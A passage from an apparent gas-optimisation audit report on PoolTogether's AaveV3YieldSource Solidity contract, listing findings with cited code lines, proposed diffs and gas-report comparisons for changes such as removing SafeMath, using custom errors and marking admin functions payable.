·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110662  ·     153714  ·     142211  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2505106  ·    2505118  ·    2505116  ·        8.4 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 4. Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nUse a larger size then downcast where needed\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n47       uint8 decimals,\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L47\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n136     uint8 private immutable _decimals;\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L136\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n145     uint16 private constant REFERRAL_CODE = uint16(188);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L145\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #4\n\n165       uint8 decimals_,\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L165\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..0dfa477 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -44,7 +44,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     IPoolAddressesProviderRegistry poolAddressesProviderRegistry,\n     string name,\n     string symbol,\n-    uint8 decimals,\n+    uint256 decimals,\n     address owner\n   );\n \n@@ -133,7 +133,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n   IPoolAddressesProviderRegistry public poolAddressesProviderRegistry;\n \n   /// @notice ERC20 token decimals.\n-  uint8 private immutable _decimals;\n+  uint256 private immutable _decimals;\n \n   /**\n    * @dev Aave genesis market PoolAddressesProvider's ID.\n@@ -142,7 +142,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n   uint256 private constant ADDRESSES_PROVIDER_ID = uint256(0);\n \n   /// @dev PoolTogether's Aave Referral Code\n-  uint16 private constant REFERRAL_CODE = uint16(188);\n+  uint256 private constant REFERRAL_CODE = 188;\n \n   /* ============ Constructor ============ */\n \n@@ -162,7 +162,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     IPoolAddressesProviderRegistry _poolAddressesProviderRegistry,\n     string memory _name,\n     string memory _symbol,\n-    uint8 decimals_,\n+    uint256 decimals_,\n     address _owner\n   ) Ownable(_owner) ERC20(_name, _symbol) ReentrancyGuard() {\n     require(address(_aToken) != address(0), \"AaveV3YS/aToken-not-zero-address\");\n@@ -218,7 +218,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @return The number of decimals.\n    */\n   function decimals() public view virtual override returns (uint8) {\n-    return _decimals;\n+    return uint8(_decimals);\n   }\n \n   /**\n@@ -234,7 +234,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n \n     address _underlyingAssetAddress = _tokenAddress();\n     IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);\n-    _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), REFERRAL_CODE);\n+    _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), uint16(REFERRAL_CODE));\n \n     _mint(_to, _shares);\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..367daee 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2505659  ·    2505671  ·    2505669  ·        8.4 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 5. Don't use `SafeMath` once the solidity version is 0.8.0 or greater\nVersion 0.8.0 introduces internal overflow checks, so using `SafeMath` is redundant and adds overhead\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n262   uint256 _balanceDiff = _afterBalance.sub(_beforeBalance);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L262\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n361   return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L361\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n373   return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L373\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..6346344 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -11,7 +11,6 @@ import { IRewardsController } from \"@aave/periphery-v3/contracts/rewards/interfa\n import { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n import { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n-import { SafeMath } from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n import { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n \n import { Manageable, Ownable } from \"@pooltogether/owner-manager-contracts/contracts/Manageable.sol\";\n@@ -23,7 +22,6 @@ import { IYieldSource } from \"@pooltogether/yield-source-interface/contracts/IYi\n  * @notice Yield Source for a PoolTogether prize pool that generates yield by depositing into Aave V3.\n  */\n contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n-  using SafeMath for uint256;\n   using SafeERC20 for IERC20;\n \n   /* ============ Events ============ */\n@@ -259,7 +257,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     _pool().withdraw(_underlyingAssetAddress, _redeemAmount, address(this));\n     uint256 _afterBalance = _assetToken.balanceOf(address(this));\n \n-    uint256 _balanceDiff = _afterBalance.sub(_beforeBalance);\n+    uint256 _balanceDiff = _afterBalance - _beforeBalance;\n     _assetToken.safeTransfer(msg.sender, _balanceDiff);\n \n     emit RedeemedToken(msg.sender, _shares, _redeemAmount);\n@@ -358,7 +356,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     uint256 _supply = totalSupply();\n \n     // shares = (tokens * totalShares) / yieldSourceATokenTotalSupply\n-    return _supply == 0 ? _tokens : _tokens.mul(_supply).div(aToken.balanceOf(address(this)));\n+    return _supply == 0 ? _tokens : _tokens * _supply / aToken.balanceOf(address(this));\n   }\n \n   /**\n@@ -370,7 +368,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     uint256 _supply = totalSupply();\n \n     // tokens = (shares * yieldSourceATokenTotalSupply) / totalShares\n-    return _supply == 0 ? _shares : _shares.mul(aToken.balanceOf(address(this))).div(_supply);\n+    return _supply == 0 ? _shares : _shares * aToken.balanceOf(address(this)) / _supply;\n   }\n \n   /**\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..1c91b72 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -13,11 +13,11 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110713  ·            1  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  redeemToken             ·          -  ·          -  ·     110584  ·            1  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110584  ·     153720  ·     142189  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2497329  ·    2497341  ·    2497339  ·        8.3 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 6. `require()` or `revert()` statements that check input arguments should be at the top of the function\nChecks that involve constants should come before checks that involve state variables\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n177       require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L177\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n179       require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L179\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..5d7d9fe 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -166,17 +166,16 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     address _owner\n   ) Ownable(_owner) ERC20(_name, _symbol) ReentrancyGuard() {\n     require(address(_aToken) != address(0), \"AaveV3YS/aToken-not-zero-address\");\n+    require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n+    require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n+    require(address(_rewardsController) != address(0), \"AaveV3YS/RC-not-zero-address\");\n+    require(address(_poolAddressesProviderRegistry) != address(0), \"AaveV3YS/PR-not-zero-address\");\n     aToken = _aToken;\n \n-    require(address(_rewardsController) != address(0), \"AaveV3YS/RC-not-zero-address\");\n     rewardsController = _rewardsController;\n \n-    require(address(_poolAddressesProviderRegistry) != address(0), \"AaveV3YS/PR-not-zero-address\");\n     poolAddressesProviderRegistry = _poolAddressesProviderRegistry;\n \n-    require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n-\n-    require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n     _decimals = decimals_;\n \n     // Approve once for max amount\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..e76a03d 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2505548  ·    2505560  ·    2505558  ·        8.4 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 7. Use custom errors rather than `revert()`/`require()` strings to save gas\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n168       require(address(_aToken) != address(0), \"AaveV3YS/aToken-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L168\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n171       require(address(_rewardsController) != address(0), \"AaveV3YS/RC-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L171\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n174       require(address(_poolAddressesProviderRegistry) != address(0), \"AaveV3YS/PR-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L174\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #4\n\n177       require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L177\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #5\n\n179       require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L179\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #6\n\n233       require(_shares > 0, \"AaveV3YS/shares-gt-zero\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L233\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #7\n\n276       require(_to != address(0), \"AaveV3YS/payee-not-zero-address\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L276\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #8\n\n337       require(_token != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L337\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #9\n\n349       require(_token != address(aToken), \"AaveV3YS/forbid-aToken-allowance\");\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L349\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..0a01635 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -26,6 +26,17 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n   using SafeMath for uint256;\n   using SafeERC20 for IERC20;\n \n+  error ATokenNotZeroAddress();\n+  error RCNotZeroAddress();\n+  error PRNotZeroAddress();\n+  error OwnerNotZeroAddress();\n+  error DecimalsGtZero();\n+  error SharesGtZero();\n+  error PayeeNotZeroAddress();\n+  error ForbidATokenTransfer();\n+  error ForbidATokenAllowance();\n+\n+\n   /* ============ Events ============ */\n \n   /**\n@@ -165,18 +176,18 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     uint8 decimals_,\n     address _owner\n   ) Ownable(_owner) ERC20(_name, _symbol) ReentrancyGuard() {\n-    require(address(_aToken) != address(0), \"AaveV3YS/aToken-not-zero-address\");\n+    if (address(_aToken) == address(0)) revert ATokenNotZeroAddress();\n     aToken = _aToken;\n \n-    require(address(_rewardsController) != address(0), \"AaveV3YS/RC-not-zero-address\");\n+    if (address(_rewardsController) == address(0)) revert RCNotZeroAddress();\n     rewardsController = _rewardsController;\n \n-    require(address(_poolAddressesProviderRegistry) != address(0), \"AaveV3YS/PR-not-zero-address\");\n+    if (address(_poolAddressesProviderRegistry) == address(0)) revert PRNotZeroAddress();\n     poolAddressesProviderRegistry = _poolAddressesProviderRegistry;\n \n-    require(_owner != address(0), \"AaveV3YS/owner-not-zero-address\");\n+    if (_owner == address(0)) revert OwnerNotZeroAddress();\n \n-    require(decimals_ > 0, \"AaveV3YS/decimals-gt-zero\");\n+    if (decimals_ == 0) revert DecimalsGtZero();\n     _decimals = decimals_;\n \n     // Approve once for max amount\n@@ -230,7 +241,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    */\n   function supplyTokenTo(uint256 _depositAmount, address _to) external override nonReentrant {\n     uint256 _shares = _tokenToShares(_depositAmount);\n-    require(_shares > 0, \"AaveV3YS/shares-gt-zero\");\n+    if (_shares == 0) revert SharesGtZero();\n \n     address _underlyingAssetAddress = _tokenAddress();\n     IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);\n@@ -273,7 +284,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @return True if operation was successful.\n    */\n   function claimRewards(address _to) external onlyManagerOrOwner returns (bool) {\n-    require(_to != address(0), \"AaveV3YS/payee-not-zero-address\");\n+    if (_to == address(0)) revert PayeeNotZeroAddress();\n \n     address[] memory _assets = new address[](1);\n     _assets[0] = address(aToken);\n@@ -334,7 +345,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     address _to,\n     uint256 _amount\n   ) external onlyManagerOrOwner {\n-    require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n+    if (address(_token) == address(aToken)) revert ForbidATokenTransfer();\n     _token.safeTransfer(_to, _amount);\n     emit TransferredERC20(msg.sender, _to, _amount, _token);\n   }\n@@ -346,7 +357,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @param _token Address of the ERC20 token to check\n    */\n   function _requireNotAToken(address _token) internal view {\n-    require(_token != address(aToken), \"AaveV3YS/forbid-aToken-allowance\");\n+    if (_token == address(aToken)) revert ForbidATokenTransfer();\n   }\n \n   /**\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..3aa8ff3 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -17,7 +17,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  setManager              ·          -  ·          -  ·      47982  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110662  ·     153714  ·     142211  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2461083  ·    2461095  ·    2461093  ·        8.2 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 8. Functions guaranteed to revert when called by normal users can be marked `payable`\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #1\n\n275     function claimRewards(address _to) external onlyManagerOrOwner returns (bool) {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L275\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #2\n\n296     function decreaseERC20Allowance(\n297       IERC20 _token,\n298       address _spender,\n299       uint256 _amount\n300     ) external onlyManagerOrOwner {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L296-L300\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #3\n\n315     function increaseERC20Allowance(\n316       IERC20 _token,\n317       address _spender,\n318       uint256 _amount\n319     ) external onlyManagerOrOwner {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L315-L319\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol   #4\n\n332     function transferERC20(\n333       IERC20 _token,\n334       address _to,\n335       uint256 _amount\n336     ) external onlyManagerOrOwner {\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol#L332-L336\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..b16b82a 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -272,7 +272,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n    * @param _to Address where the claimed rewards will be sent\n    * @return True if operation was successful.\n    */\n-  function claimRewards(address _to) external onlyManagerOrOwner returns (bool) {\n+  function claimRewards(address _to) payable external onlyManagerOrOwner returns (bool) {\n     require(_to != address(0), \"AaveV3YS/payee-not-zero-address\");\n \n     address[] memory _assets = new address[](1);\n@@ -297,7 +297,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     IERC20 _token,\n     address _spender,\n     uint256 _amount\n-  ) external onlyManagerOrOwner {\n+  ) payable external onlyManagerOrOwner {\n     _requireNotAToken(address(_token));\n     _token.safeDecreaseAllowance(_spender, _amount);\n     emit DecreasedERC20Allowance(msg.sender, _spender, _amount, _token);\n@@ -316,7 +316,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     IERC20 _token,\n     address _spender,\n     uint256 _amount\n-  ) external onlyManagerOrOwner {\n+  ) payable external onlyManagerOrOwner {\n     _requireNotAToken(address(_token));\n     _token.safeIncreaseAllowance(_spender, _amount);\n     emit IncreasedERC20Allowance(msg.sender, _spender, _amount, _token);\n@@ -333,7 +333,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     IERC20 _token,\n     address _to,\n     uint256 _amount\n-  ) external onlyManagerOrOwner {\n+  ) payable external onlyManagerOrOwner {\n     require(address(_token) != address(aToken), \"AaveV3YS/forbid-aToken-transfer\");\n     _token.safeTransfer(_to, _amount);\n     emit TransferredERC20(msg.sender, _to, _amount, _token);\n```\n\n```diff\ndiff --git a/gas.orig b/gas.new\nindex d87edc2..b10b8b3 100644\n--- a/gas.orig\n+++ b/gas.new\n@@ -5,11 +5,11 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Contract                  ·  Method                  ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  claimRewards            ·      54735  ·      56896  ·      55816  ·            4  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  claimRewards            ·      54711  ·      56872  ·      55792  ·            4  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      37465  ·      39638  ·      38910  ·            3  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  decreaseERC20Allowance  ·      37441  ·      39614  ·      38886  ·            3  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      59133  ·      61618  ·      61212  ·            7  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  increaseERC20Allowance  ·      59109  ·      61594  ·      61188  ·            7  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  mint                    ·      51381  ·      68493  ·      61904  ·           13  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -19,7 +19,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  AaveV3YieldSourceHarness  ·  supplyTokenTo           ·     110668  ·     153720  ·     142217  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness  ·  transferERC20           ·      58318  ·      60467  ·      59393  ·            2  ·          -  │\n+|  AaveV3YieldSourceHarness  ·  transferERC20           ·      58294  ·      60443  ·      59369  ·            2  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n |  ERC20Mintable             ·  approve                 ·      26692  ·      46592  ·      43275  ·            6  ·          -  │\n ·····························|··························|·············|·············|·············|···············|··············\n@@ -29,7 +29,7 @@\n ·····························|··························|·············|·············|·············|···············|··············\n |  Deployments                                          ·                                         ·  % of limit   ·             │\n ························································|·············|·············|·············|···············|··············\n-|  AaveV3YieldSourceHarness                             ·    2505760  ·    2505772  ·    2505770  ·        8.4 %  ·          -  │\n+|  AaveV3YieldSourceHarness                             ·    2586991  ·    2587003  ·    2587001  ·        8.6 %  ·          -  │\n ························································|·············|·············|·············|···············|··············\n |  ERC20Mintable                                        ·          -  ·          -  ·    1154099  ·        3.8 %  ·          -  │\n ·-------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\n```\n\n### 9. Method IDs can be fiddled with to reduce gas costs\nSee [this](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92) page for details\n\n```solidity\nFile: contracts/AaveV3YieldSource.sol (various lines)   #1\n\n```\nhttps://github.com/pooltogether/aave-v3-yield-source/blob/e63d1b0e396a5bce89f093630c282ca1c6627e44/contracts/AaveV3YieldSource.sol\n\n```diff\ndiff --git a/AaveV3YieldSource.sol.orig b/AaveV3YieldSource.sol.new\nindex 3975311..dc04818 100644\n--- a/AaveV3YieldSource.sol.orig\n+++ b/AaveV3YieldSource.sol.new\n@@ -180,7 +180,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n     _decimals = decimals_;\n \n     // Approve once for max amount\n-    IERC20(_tokenAddress()).safeApprove(address(_pool()), type(uint256).max);\n+    IERC20(_tokenAddress()).safeApprove(address(_pool_Jo$()), type(uint256).max);\n \n     emit AaveV3YieldSourceInitialized(\n       _aToken,\n@@ -234,7 +234,7 @@ contract AaveV3YieldSource is ERC20, IYieldSource, Manageable, ReentrancyGuard {\n \n     address _underlyingAssetAddress = _tokenAddress();\n     IERC20(_underlyingAssetAddress).safeTransferFrom(msg.sender, address(this), _depositAmount);\n-    _pool().supply(_underlyingAssetAddress, _depositAmount, address(this), REFERRAL_CODE);\n+    _pool_Jo$().supply(_underlyingAssetAddress, 